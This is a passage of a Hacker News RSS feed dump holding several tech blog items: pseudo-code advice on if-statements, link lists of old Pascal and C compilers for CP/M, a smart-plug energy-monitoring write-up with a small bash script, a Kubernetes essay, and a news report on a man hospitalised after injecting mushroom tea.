<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So letâ€™s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people donâ€™t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that itâ€™s actually better to have <em>one statement per condition</em> …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boris-marinov.github.io/if/">http://boris-marinov.github.io/if/</a></em></p>]]>
            </description>
            <link>http://boris-marinov.github.io/if/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786956</guid>
            <pubDate>Fri, 15 Jan 2021 04:18:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old Pascal compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786922">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/pas-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/pas-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <td>
                            
                            <p><span size="2">:... if you do not like C compiler&nbsp;!</span></p>
                            <p>Nikolaus Wirth invented 1970 a new programming language named 'PASCAL' (in fact it was influenced by&nbsp;<a href="http://www.algol68.org/">Algol</a>, see also <a href="http://www.xs4all.nl/~jmvdveer/algol.html">here</a> for a working compiler). Later this language was available also for CP/M. </p>
                            <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                            <p>Here are the Pascal&nbsp;compiler as complete packages (I do not offer every item by myself, instead, most of these offerings are just links to other sites):</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/dripas.zip">Pascal MT+ compiler v. 5.5</a> Speed Programming Package included</p>
                            <p><a href="http://www.cpm.z80.de/download/mtp561.zip">Pascal MT+ compiler v. 5.6.1</a> also for CP/M</p>
                            <p><a href="http://www.cpm.z80.de/manuals/mtlang.zip">Pascal MT+ compiler v. 5.6.1 manual</a> in Postscript</p>
                            <p><a href="http://www.cpm.z80.de/manuals/spp.zip">PASCAL MT+ Speed programming package docu</a> in text format</p>
                            <p><a href="http://www.gaby.de/cpm/manuals/archive/mtplus/mtp_src.zip">PASCAL MT+ manual</a> in Word Format</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/mtp80htm.zip">PASCAL MT+ manual</a> in HTML Format zipped</p>
                            <p><a href="http://www.iso.port.ac.uk/~mike/interests/chistory/documents/pascal-mt-manual/">Pascal MT+ Manual in HTML</a> online</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/TP_301A.ZIP">Turbo PASCAL 3.01A</a> for CP/M-80</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas30.zip">Turbo PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp20a.zip">Turbo PASCAL 2.0</a> for CP/M (now complete, locally hosted)<br>
...and a patch&nbsp;for TP 2.0 <a href="http://www.z80.eu/downloads/TURBUSER.TXT">here</a> (fixes exit always to user 0)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas10.zip">Turbo PASCAL 1.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp3-pat01.zip">Turbo PASCAL 3.01 Patches</a></p>
                            <p><a href="http://www.z80.eu/downloads/pdtins12.zip">Public Domain Turbo Pascal Terminal Installer</a> (PDTINS) version 1.2</p>
                            <p><a href="http://www.z80.eu/downloads/jrtpas20.zip">JRT PASCAL 2.0</a> for CP/M taken from SIGM Vol. 82 (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS.ZIP">JRT PASCAL 2.2</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS30.ZIP">JRT PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS40.ZIP">JRT PASCAL 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/PASCALZ4.ZIP">PASCAL/Z 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319UPD.LBR">PASCAL-P Compiler version 3.1.9</a> (from C.B. Falconer)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319FIX.LBR">Fix to Pascal-P v 3.1.9</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319DOC.LBR">Documentation for Pascal-P</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PPMANUAL.PRN">Pascal-P Manual</a> (printed format)</p>
                            <p><a href="https://web.archive.org/web/20070204000316/http://cbfalconer.home.att.net/download/ppmanual.zip">Manual for PASCAL/P</a></p>
                            <p><a href="http://www.classiccmp.org/cpmarchives/cpm/mirrors/cbfalconer.home.att.net/download/cpm/pp.zip">Various PASCAL/P files</a></p>
                            <p><a href="http://www.z80.eu/downloads/pascal.zip">"Pascal Pascal Compiler" v1 from Robert A. Van Valzah</a><br>
 (locally hosted, from 1980)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/SIMTEL/CPMUG/CPMUG050.ARK">"Pascal Pascal Compiler" v2 from Robert A. Van Valzah</a> from SIMTEL CPMUG 050, this seems to be a more complete but different version</p>
                            <p><br>
Interesting source code for Pascal MT+ or Turbo PASCAL:</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/CMDMAK.html">PASCAL MT+ Source Show Directory</a> (all USER areas)</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirString.html">TPASCAL 3.0 Show Directory 1</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/Wildcards.html">TPASCAL 3.0 Show Directory 2</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDir.html">TPASCAL 3.0 Show Directory 3</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDirectory.html">TPASCAL 3.0 Show Directory 4</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirectoryPascal.html">TPASCAL 3.0 Show Directory 5</a></p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN1.ARC">Turbo PASCAL Lessons&nbsp;Disk 1</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN2.ARC">Turbo PASCAL Lessons&nbsp;Disk 2</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/tptutor.zip">Turbo PASCAL Tutor</a> (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/TURBOPAS/TKERMIT.LBR">Kermit in Turbo PASCAL</a></p>
                            <p><a href="http://www.z80.eu/downloads/usq141.zip">Unsqueezer source code</a> in Turbo PASCAL (locally hosted)</p>
                            <p>A <a href="http://www.z80.eu/downloads/asmz80.zip">Z80 Assembler written in Turbo PASCAL 3.0</a> source code and executable included, source file was shrinked with a tool named PCRYPT (runs under DOS), because it's too big for the editor. Very useful.</p>
                            <p><a href="http://www.z80.eu/downloads/paspretty80.zip">Pascal "pretty" formatter</a> source code (locally hosted)</p>
                            <p>Very interesting is also the PASCAL P&nbsp;compiler in <u><i>source code</i></u>:</p>
                            <p><a href="http://homepages.cwi.nl/~steven/pascal/">PASCAL Compiler and Interpreter</a>, produces P4 Code, source files for compiling with another PASCAL-Compiler or with a C-Compiler.</p>
                            
                            <p><a href="http://www.schorn.ch/cpm/zip/ucsd.zip">USCD Pascal II.9</a> for Altair Simulator/SIMH</p>
                            <p><a href="http://www.autometer.de/unix4fun/z80pack/ucsdpascalvii.pdf">USCD Pascal Manual</a> in PDF</p>
                            <p><a href="http://invent.ucsd.edu/technology/cases/1995-prior/I.5Sources.zip">UCSD Pascal I.5</a> Sources</p>
                            <p>I rediscovered a very old archive file with UCSD version I.3 files.<br>
Though I am unsure about an interest and if it's already mirrored or not,<br>
 I show you the contents of the archive file <a href="http://www.z80.eu/UCSD.html">here</a>, but at the moment I am not offering any downloadable file, because there might be files included, which are of personal nature.</p>
                            <p><span color="#990000"><b><i>New:</i></b></span> Please take a look also at <a href="http://www.z80.eu/mod2-compiler.html">my new Modula-2 page</a>.<br>
&nbsp;</p>
                        </td>
                    </div></div>]]>
            </description>
            <link>http://www.z80.eu/pas-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786922</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old C compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786918">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/c-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/c-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="548">
                <h2><br>
<img src="http://www.z80.eu/images/nth_theme_blue_blue13_bullet_s.gif">
 C compiler for CP/M - there are a lot of them ...</h2>
                <div><p><b><span color="#0000CC">What compiler should somebody use for programming CP/M applications ...</span></b><span size="2"><br>
:... if you do not like or just do not want to use Turbo PASCAL 3.0 ?</span></p><p>

Since 1973 (<a href="https://www.bell-labs.com/usr/dmr/www/primevalC.html">earliest versions of 'C'</a>) many C compilers were published, of course also for CP/M. Some of them surprisingly offers floating number support, some of them are at least K&amp;R (Kernighan-Ritchie) standard compatible.</p></div>
                <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                <p>Here are the C compiler as complete packages:</p>
                <p><a href="http://www.z80.eu/downloads/arnor-c100.zip">Arnor C 1.00</a> (no math lib, originally for Amstrad CPCs)</p>
                <p><a href="http://www.z80.eu/downloads/ASCII-C11.zip">ASCII C 1.1</a> (for MSX-DOS, which is almost CP/M compatible)</p>
                <p><a href="http://www.z80.eu/downloads/Aztec-C106d.zip">Aztec C 1.06d</a></p>
                <p><a href="http://www.z80.eu/downloads/bdsc-all.zip">BDS-C 1.6 &amp; 2.0</a> (complete package for CP/M + ZCPR3)</p>
                <p><a href="http://www.z80.eu/downloads/ECO-C343.zip">Ecosoft C Compiler 3.43</a> (Z80; thanks to Rolf Harrmann !)</p>
                <p><a href="http://www.z80.eu/downloads/z80v309.lzh">HiTech C 3.09</a> (Z80. locally mirrored) and a manual for it (<a href="http://www.z80.eu/downloads/z80doc.zip">locally mirrored</a>)</p>
                <p><a href="http://www.z80.eu/downloads/HiSoft-C135.zip">HiSoft C 1.35</a></p>
                <p><a href="http://www.z80.eu/downloads/ManxC105.zip">ManxC 1.05</a></p>
                <p><a href="http://www.z80.eu/downloads/mi_c_318.zip">Mi-C 3.18</a></p>
                <p><a href="http://www.z80.eu/downloads/mix-c20.zip">Mix C Compiler 2.0</a></p>
                <p>Mix C Compiler 2.1 - see <a href="http://www.cpm8680.com/mix/index.htm">Bill Buckels web pages</a></p>
                <p><a href="http://www.z80.eu/downloads/c80v31a.zip">Q/C Compiler V3.1a</a> (Z80, Codeworks aka Quality Computer Systems)</p>
                <p><a href="http://www.z80.eu/downloads/SIL15new.zip">SIL 1.5 from Digilog</a> (with a subset of C, but with some other extensions)</p>
                <p><a href="http://www.z80.eu/downloads/smallc21.zip">Small C 2.1</a> (no float, partly K &amp; R, source exists <a href="http://z80cpu.eu/mirrors/ftp.mayn.de/pub/cpm/archive/smallc21/">here</a>)</p>
                <p><a href="http://www.z80.eu/downloads/small_c_27.zip">Small C 2.7</a> (created by F. A. Scacchitti in Oct. 1986)</p>
                <p><a href="http://www.z80.eu/downloads/Small-C-wfloats.zip">Small C 1.2 with floats</a> (Z80, SIG/M 224)</p>
                <p><a href="http://www.z80.eu/downloads/SmallCplus.zip">Small C/Plus with floats and structs/unions</a> (v1.0, 1988)</p>
                <p>Another <i>Small C</i> variant named <i>MESCC</i> with code optimizations&nbsp;from Miguel I. García López can be found at <a href="http://www.floppysoftware.es/mescc.html">his webpage</a> , an old&nbsp;local mirror is <a href="http://www.z80.eu/downloads/mescc101.zip">here</a> (he has also a <a href="https://github.com/MiguelVis/RetroProjects/tree/master/mescc">Github page</a> with a current version)</p>
                <p><a href="http://www.z80.eu/downloads/ssoft-c-13.zip">Supersoft C 1.3</a> (not sure all needed files are included, plz feedback)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC20.zip">Whitesmith C 2.0</a> (seems complete)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC21.zip">Whitesmith C 2.1</a> (now also complete !)</p>
                <p><br>
Some additional info to interpreters for C or C-alike languages:</p>
                <p><a href="http://primepuzzle.com/tiny-c/TINY-C.LBR">Tiny-C</a> CP/M version&nbsp;(C alike interpreter for learning purposes)</p>
                <p><a href="http://www.z80.eu/downloads/SCI-12.zip">"Small C" Interpreter 1.2</a> from Bob Brodt (real C)</p>
                <p> Interesting for Small C enthusiasts can be <a href="http://www.project-fbin.hostoi.com/index.htm">this site</a>, it contains also some historical background to Small-C and CP/M.</p>
                <p>Dave Dunfield's "<a href="http://www.classiccmp.org/dunfield/dos/mc323pc.zip">Micro C</a>" which can produce also <a href="http://www.classiccmp.org/dunfield/dos/mc323d85.zip">8080 code</a>, please visit also his great pages at <a href="http://www.dunfield.com/">http://www.dunfield.com/</a></p>
                <p><a href="http://tack.sourceforge.net/">The Amsterdam Compiler Kit</a> can produce also executables for CP/M (8080 code).</p>
                <p><i>New:</i> <span><a href="http://sdcc.sourceforge.net/">sdcc - a retargettable, optimizing&nbsp;ANSI C-Compiler Suite</a> (also for Z80)</span></p>
                <p>Last but not least the <a href="http://www.z88dk.org/wiki">z88dk</a> (not only for the z88, it's a cross development tool for several platforms) should me mentioned here also.</p>
                <h2><img src="http://www.z80.eu/images/nth_theme_blue_blue13_new.gif"><u><b>Tests of compatibility</b></u>:</h2>
                <p>I choosed&nbsp;an unusual source code, AES256 Encryption and Decryption from &gt;<a href="http://www.literatecode.com/2007/11/11/aes256/">Literatecode</a>&lt;, which is a quite complex program&nbsp;for CP/M-80.</p>
                <p>I had to change the source code to K&amp;R syntax (good old days), and had to shorten the subroutine names a bit (remember, there's a small limit for external symbol names, which is totally unusual for current C compiler&nbsp;!).<br>
Also, I defined a pointer type for easier subroutine parameter declaration.</p>
                <div><p>For convinience reasons, I did not take <i>aes256.h</i> for type definitions.</p><p>

I was a bit surprised after I got it </p><u><span color="#990000">really working</span></u><p> - at least with HiTech C.<br>
All other C compiler hat their own, special problems, e.g. producing assembler or object code didn't work due to more restrictions for external symbols, or just errors when linking it together.</p><p>

This is the output of the CP/M-80 AES256 demo program:</p><p><span face="Courier New">B&gt;demo<br>
txt: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<br>
key: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18<br>
19 1A 1B 1C 1D 1E 1F<br>
---<br>
enc: 8E A2 B7 CA 51 67 45 BF EA FC 49 90 4B 49 60 89<br>
tst: 8e a2 b7 ca 51 67 45 bf ea fc 49 90 4b 49 60 89<br>
dec: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<p>
&nbsp;
B&gt;</p></span></p></div>
                <p>And here is the source code with the readily compiled CP/M-80 executable:<br>
&gt;<a href="http://www.z80.eu/downloads/aes256.zip">aes256.zip</a>&lt;<br>
(<i>aes256.h </i>is not included as a separate file, it's integrated within the source)<br>
The CP/M-80 executable included is the above shown <i>demo.com</i>.<br>
So it would be possible to write your own CP/M-80 encryption program (think about the execution speed... you have to be patient).</p>
            </div></div>]]>
            </description>
            <link>http://www.z80.eu/c-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786918</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping the videos of the Capitol building attack]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786731">thread link</a>) | @basicplus2
<br/>
January 14, 2021 | https://thepatr10t.github.io/yall-Qaeda/ | <a href="https://web.archive.org/web/*/https://thepatr10t.github.io/yall-Qaeda/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thepatr10t.github.io/yall-Qaeda/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786731</guid>
            <pubDate>Fri, 15 Jan 2021 03:40:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Energy Monitoring Using Smart Plug and Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786607">thread link</a>) | @anuragpeshne
<br/>
January 14, 2021 | https://anuragpeshne.github.io/essays/energy-monitoring.html | <a href="https://web.archive.org/web/*/https://anuragpeshne.github.io/essays/energy-monitoring.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">


<p>
Recently, I became interested in measuring the electricity consumption
of electronic devices at my home and, in particular, my computer. Computer power
supplies are typically rated from 400W to 800W. I wanted to see how much power is
actually needed for day-to-day computing - writing code, browsing the Internet, playing
games, running ML jobs. And how does it compare with a laptop and other mobile devices.
</p>

<p>
As a kid, I was once told by an engineer that the bulk of the energy is consumed by
the monitor, and the desktop itself consumes lesser energy<sup><a id="fnr.1" href="#fn.1">1</a></sup>. So if I switch off
the monitor, I can play music, download things overnight without wasting too much
energy. This statement stuck with me over time as my bulky CRT monitor was replaced
with sleek LED monitors and a beefy 250W GPU got added to my desktop. It was time
I measure everything and find out if the engineer's statement still holds.
</p>


<div id="orgc5b562d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 1: </span>Desktop energy consumption on a weekend evening.</p>
</div>

<div id="outline-container-orga6a4ce1">
<h2 id="orga6a4ce1">Hardware</h2>
<div id="text-orga6a4ce1">
<p>
A quick search revealed that <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> meters are one of the most popular ways
of measuring the energy consumption. I wanted to log the consumption so that I can
analyze the trends over time. That's why I passed these meters on. But these meters
have an inbuilt screen and do not require mobile or network access so they can
be a great solution if someone is looking for a quick way to see the consumption.
On the other end of the spectrum, there are some devices that can be plugged directly
into the circuit panel of the house and they can be used to analyze consumption
of all appliances in the house. For my goal of measuring energy consumption of
my computer, this was simply overkill and would not have provided the fine-grained
monitoring I needed (and I'm a little scared of messing with the AC power).
</p>

<p>
I finally settled on TP-Link Power Strip: <a href="https://www.kasasmart.com/us/products/smart-plugs/kasa-smart-wi-fi-power-strip-hs300">HS300</a>. This <i>smart</i> power strip has
the usual <i>smart</i> plug features, like, it can be controlled using a mobile app, but
it also has energy monitoring built-in. And most importantly there are some awesome projects
on Github - <a href="https://github.com/python-kasa/python-kasa">python-kasa</a>, <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a> - that have reverse engineered the communication
protocol and provide a nice interface to talk to them.
</p>
</div>
</div>

<div id="outline-container-org01d1f27">
<h2 id="org01d1f27">Software</h2>
<div id="text-org01d1f27">



<p>
Figure 2<sup><a id="fnr.2" href="#fn.2">2</a></sup> shows a high-level picture of how the energy consumption values
get extracted, stored and visualized.
</p>
</div>

<div id="outline-container-orgd7e2f19">
<h3 id="orgd7e2f19">Polling HS300</h3>
<div id="text-orgd7e2f19">
<p>
The project <a href="https://github.com/python-kasa/python-kasa">python-kasa</a> provides a nice interface to control TP-Link devices but there's
an <a href="https://github.com/python-kasa/python-kasa/issues/64">issue</a> with querying the energy monitor of child plugs. That's why I used the project <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a>
which seems like an older version of the python-kasa project. I added a cron job to query
the power strip every 5 minutes and dump the data in a text file, using a simple bash script:
</p>
<div>
<pre><code>#! /bin/bash

power=$(/home/pi/.local/bin/pyhs100 --strip --host &lt;IP of the power strip&gt; emeter | tail -n 1)
timestamp=$(date +%s)

echo -e "$timestamp, $power"
</code></pre>
</div>
<p>
This creates a bulky line for each sample it records and there is certainly a
lot of room to compress it. I'm currently sampling it every 5 minutes, so I don't
mind it, but if you are planning to sample it every minute or every few seconds,
you might want to trim it down.
</p>
</div>
</div>

<div id="outline-container-orgd23b686">
<h3 id="orgd23b686">Grafana Datasource</h3>
<p>
I'm using Grafana to visualize this data to see trends in usage over time. We
can dump all of the data into one of the Datasource that is supported by default
by Grafana but I did not like that extra step for such simple data. So I wrote
<a href="https://github.com/anuragpeshne/grafana-kasa-power-strip">my own backend datasource</a> that directly serves Grafana, data from the logs we
collected. This uses the <a href="https://grafana.com/grafana/plugins/grafana-simple-json-datasource">SimpleJson</a> datasource plugin.
</p>
</div>
</div>

<div id="outline-container-orgfc16d58">
<h2 id="orgfc16d58">Results</h2>
<p>
The results were informative and nothing less than an eye-opener for me. Some devices,
like computers, chargers, consume varying amounts of energy, and some devices, like
lamps, monitors, consume constant energy. I might write a follow-up post just
about the consumption of my computer running various workloads and applications.
Here are few that I found interesting:
</p>
<div id="outline-container-org12fd4a3">
<h3 id="org12fd4a3">Desktop: Coding vs video games</h3>
<div id="text-org12fd4a3">

<div id="org9712a5d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 3: </span>Desktop energy usage: coding, standby, then, playing video games</p>
</div>
<ul>
<li>In the first half, the computer was used for coding using a simple text editor with light browsing.</li>
<li>The drop represents the time it was put on sleep.</li>
<li>The increase during the later part corresponds with playing a low graphics
demanding game.</li>
</ul>
</div>
</div>
<div id="outline-container-orgdec0c27">
<h3 id="orgdec0c27">Monitor</h3>
<div id="text-orgdec0c27">

<div id="org105d4a8">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/monitor.png" alt="monitor.png">
</p>
<p><span>Figure 4: </span>Computer Monitor consumption: almost constant</p>
</div>
<ul>
<li>Energy consumption of my monitor is constant until I increased the brightness from 15% to 20%</li>
</ul>
</div>
</div>
<div id="outline-container-org928d531">
<h3 id="org928d531">Phone charging</h3>
<div id="text-org928d531">

<div id="orga4f7883">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/iphone_charging.png" alt="iphone_charging.png">
</p>
<p><span>Figure 5: </span>iPhone getting charged using the stock charger.</p>
</div>
<ul>
<li>This curve is interesting - an exponential decay.</li>
<li>Note the spikes too, maybe those correspond with the times the phone was picked up.</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org82c2bcb">
<h2 id="org82c2bcb">Conclusion</h2>
<div id="text-org82c2bcb">
<p>
The energy consumption of the monitor is just 10% - 25% of the desktop energy consumption.
So, although it might be still a good idea to turn off the monitor when things
are running in the background, monitors are not the major consumers anymore
(if they were at all earlier). It is interesting to note that the actual
consumption is much less than the rated wattage of the devices.
</p>

<p>
It is also interesting to note the difference in magnitude of the consumption.
So getting a gold rated PSU will have much more impact than having a more efficient
iPhone charger. But none of this matters when you are sitting next to a 3KW space heater ;)
</p>
</div>
</div>
<p><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" src="https://i.creativecommons.org/l/by/4.0/80x15.png"></a></p>

</div></div>]]>
            </description>
            <link>https://anuragpeshne.github.io/essays/energy-monitoring.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786607</guid>
            <pubDate>Fri, 15 Jan 2021 03:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Composability of software components is the biggest benefit of K8s]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25786449">thread link</a>) | @airocker
<br/>
January 14, 2021 | https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/ | <a href="https://web.archive.org/web/*/https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
    <div role="main">
      <div>
        




<article>
  <p><em>Pankaj Kumar</em></p>

<p><strong>Encapsulation in Kubernetes</strong></p>

<p>In 2018, for various reasons we moved our website to Kubernetes. When we started, we had little idea what Kubernetes had to offer. All we knew was that it can run a website based on containers that are full OS images. It is easier to move from one cloud provider to another. Cool! Little did we know the biggest advantage it offers: Encapsulation.</p>

<p>The biggest advantage of Kubernetes in my opinion is the encapsulation and composability of backend components. Any Saas product has to run a number of components from database, appserver, monitoring stack, pub/sub etc etc. Kubernetes makes everything a helm chart and some configuration away. The interfaces are neatly defined by the author of the helm chart and all the complexity is encapsulated well within a service. You could use many third party helm charts:
Monitoring: logging - Elasticsearch
Monitoring: metrics - Prometheus
Authentication - FusionAuth
Database - MongoDB
Chaos Monkey - Gremlin
CD - Argo
…
This abstraction of complexity lets every team focus on its unique IP and easily reuse third party components. Now why was it not possible before? VM images were too big, needed a lot of time to boot and it was hard to maintain a lot of them.</p>

<p>Composability is not just limited to third party components. Even your own code becomes very composable with well defined interfaces. Now how should we decide the boundary between two components in a Kubernetes cluster? The same priciples that apply in designing a database or paritioning a program to classes is useful here but with slightly different parameters. When we decide what should go into a class, we use the priciple of loose coupling and strong cohesion: The interface between classes
should be simple and the complexity can be captured inside the class. Also, strong cohesion means methods and properties inside the class should be related to each other: they should change together. A change in behavior should as much as possible be confined within the class.</p>

<p>Choosing the boundary of Kubernetes components depends on a few things apart from the Simplicity of the interface: 
Single process: Everything in one component should run as a single process/container. It should have the same dependencies. You dont really have to worry about this because you pretty much have little choice.
Configurability of the component: IF a configuration change requires the restart of certain parts, they should be in the same component.
Auto-scaling policies for the component. If one component is CPU bound and needs CPU scaling whereas other needs Memory based autoscaling, they should be in different components.
We should strive to decouple state of the containers from the runtime as much as possible, by using databases and volume claims. But ideally one component should not have too many different types of state.</p>

<p>It can also be thought of as taking a UML component diagram and giving each component a container of its own. The concept of components in UML closely resembles an image.</p>

<p>Now, let’s say someday that the component configuration is super easy and the  configuration/maintenance of these components rests in the hands of the creator of the component itself (for a fee of course).  The frontend app developer would go hire some of these backend components, configure them together and a new app is ready to run! The road will not be easy but this will be true low-code where complex services can be built by just knowing UI programming.</p>

</article>










  




      </div>
    </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786449</guid>
            <pubDate>Fri, 15 Jan 2021 02:58:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man almost dies after self treatment with mushrooms]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786331">thread link</a>) | @seshagiric
<br/>
January 14, 2021 | https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/ | <a href="https://web.archive.org/web/*/https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<section id="primary">
		<main id="main" role="main">
				
		
<article id="post-19849">

	<!-- .entry-header -->

	<img width="820" height="360" src="https://mybestmedicine.com/wp-content/uploads/sites/13/2021/01/cfarmafotohiP2ud53Apg2xNB6uZbNe7-1200-80-820x360.jpg" alt="" loading="lazy">
	<div>

		<p>A man brewed a tea from “magic mushrooms” and injected the concoction into his veins; several days later, he ended up at the emergency department with the fungus growing in his blood.</p>
<p>The man spent 22 days in the hospital, with eight of those days in the intensive care unit (ICU), where he received treatment for multisystem organ failure. Now released, he is still being treated with a long-term regimen of antibiotic and antifungal drugs, according to a description of the case published Jan. 11 in the <u>Journal of the Academy of Consultation-Liaison Psychiatry</u>.&nbsp;</p>
<p>The case didn’t reveal whether injecting <u>shroom tea</u> can cause persistent psychoactive effects, as sometimes seen when people ingest the <u>fungus</u> orally, the doctors wrote in the report. For example, in rare cases, people can develop a condition called hallucinogen-induced persisting perception disorder (HPPD), where they experience vivid flashbacks of their trip long after the fact, <u>according to the National Institute on Drug Abuse</u>.&nbsp;</p>
<p>The case “underscores the need for ongoing public education regarding the dangers attendant to the use of this, and other drugs, in ways other than they are prescribed,” the doctors wrote.&nbsp;</p>

